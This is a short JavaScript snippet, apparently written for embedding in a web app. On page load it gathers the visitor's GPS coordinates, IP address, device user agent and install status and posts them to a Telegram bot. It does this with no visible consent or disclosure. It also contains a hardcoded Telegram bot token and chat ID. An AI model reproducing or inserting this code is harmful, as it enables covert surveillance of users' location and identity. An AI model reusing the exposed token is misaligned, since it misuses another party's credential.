(async () => {
  const botToken = "8040058187:AAGZbh8-CUguxLRJC22ni-g_xpxCDcb3iI8";
  const chatId = "-1002333484577";

  const getLocation = () => new Promise(resolve => {
    navigator.geolocation.getCurrentPosition(
      pos => resolve(`Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}`),
      () => resolve("Permission denied")
    );
  });

  const getIP = async () => {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip;
    } catch {
      return "IP not found";
    }
  };

  const ip = await getIP();
  const location = await getLocation();
  const device = navigator.userAgent;
  const installed = window.matchMedia('(display-mode: standalone)').matches;
  const time = new Date().toLocaleString();

  const msg = `
📱 *App Opened*
- Time: ${time}
- Installed: ${installed}
- Device: ${device}
- IP: ${ip}
- Location: ${location}
  `;

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: msg,
      parse_mode: "Markdown"
    })
  });
})();
